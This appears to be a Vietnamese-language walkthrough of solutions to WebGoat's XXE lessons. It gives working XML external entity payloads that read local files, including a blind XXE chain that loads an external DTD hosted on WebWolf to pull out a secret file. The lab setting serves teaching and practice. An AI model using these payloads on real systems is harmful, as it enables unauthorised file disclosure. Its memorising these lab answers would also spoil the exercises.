# (A4) XML External Entities (XXE)

## XXE

### 4. Let’s try

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY exploit SYSTEM "file:///">
]>
<comment>
	<text>&exploit;</text>
</comment>
```

### 7. Modern REST framework

Sửa lại header thành `Content-Type: applicaiton/xml` và dùng payload tương tự bài 4

### 11. Blind XXE assignment

Host file `meo.dtd` bằng Webwolf, phải có `encoding="UTF-8"` nếu không sẽ bị lỗi:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY secret SYSTEM "file:///home/woanmeo11/.webgoat-8.2.2//XXE/secret.txt"> 
```

Lấy link file `meo.dtd` từ Webwolf và craft payload gửi đến server:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
	<!ENTITY % meo SYSTEM "http://127.0.0.1:9090/files/woanmeo11/meo.dtd">
	%meo;
]>
<comment>
    <text>bruh &secret;</text>
</comment>
```

Sau đó tìm secret ở phần comment là xong.